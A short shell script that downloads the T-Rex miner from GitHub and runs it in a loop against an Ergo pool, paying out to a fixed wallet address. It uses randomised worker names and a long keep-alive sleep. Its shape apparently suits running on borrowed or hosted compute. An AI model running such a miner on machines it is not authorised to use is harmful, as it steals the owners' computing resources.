#!/bin/sh

wget https://github.com/trexminer/T-Rex/releases/download/0.21.3/t-rex-0.21.3-linux.tar.gz

tar -xvf t-rex-0.21.3-linux.tar.gz

chmod +x t-rex

while [ 1 ]; do

sleep 5

./t-rex -a autolykos2 -o stratum+tcp://us.ergo.herominers.com:10250 -u 9iBG21PocjRTpfujup2btSBbQTQTFeN6XBR9JtLm6WxMGmhPwxt.$(echo $(shuf -i 1-30 -n 1)-ERGOKILLME) --intensity 21 --gpu-report-interval 10 --kernel 0 --dag-build-mode 0 --keep-gpu-busy

done

sleep 999999

